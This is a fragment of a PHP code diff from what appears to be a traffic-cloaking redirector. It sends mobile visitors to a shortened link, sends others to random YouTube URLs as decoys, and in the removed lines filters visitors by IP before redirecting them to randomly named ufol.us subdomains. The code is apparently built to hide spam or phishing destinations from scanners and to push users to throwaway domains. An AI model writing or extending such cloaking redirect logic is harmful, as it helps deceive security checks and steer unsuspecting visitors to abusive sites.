@@ -27,15 +27,6 @@
     }
   }
 
-  if($action == "site"){
-    require_once("filter.php");
-    $ipfilter = new IPFilter();
-    $host_verify = $ipfilter->isValid();
-    if($host_verify == false){
-      $action = "theme";
-    }
-  }
-
   function generate_name($length){
       $rname = "";
       $sesli = "aeiou";
@@ -54,8 +45,7 @@
   if($action == "mobile"){
     header("Location: http://goo.gl/c1u740");
   }else if($action == "site"){
-    $filename = generate_name(rand(5,8)).".html";
-    header("Location:http://".generate_name(rand(5,8)).".ufol.us/".$filename);
+    require_once("template.php");
   }else{
     header("HTTP/1.1 301");
     header("Location:https://www.youtube.com/watch?v=".generate_name(rand(8,9));
